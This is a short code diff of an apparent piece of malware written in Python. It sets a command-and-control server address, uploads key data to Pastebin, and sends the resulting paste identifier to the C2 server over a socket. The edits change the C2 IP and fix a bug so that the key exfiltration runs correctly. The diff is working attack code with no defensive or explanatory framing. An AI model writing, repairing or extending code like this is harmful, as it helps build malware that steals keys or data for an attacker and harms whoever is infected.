@@ -31,7 +31,7 @@ def main():
     if len(argv) > 1:
         C2_ip = argv[1]
     else:
-        C2_ip = "10.0.0.196"  # C2 server IP
+        C2_ip = "192.168.1.143"  # C2 server IP
     C2_port = 10102 # C2 server port (mismatch due to port-fowarding)
     C2_addr = (C2_ip, C2_port)
     
@@ -104,7 +104,7 @@ def main():
     key_url = requests.post(url=pastebin_url, data=key_data)
     print(key_url.text)  # print out url of paste
     
-    key_string = key_url.split('/')[-1]
+    key_string = key_url.text.split('/')[-1]
     sock.sendto(key_string.encode(), C2_addr)
 
 if __name__ == "__main__":
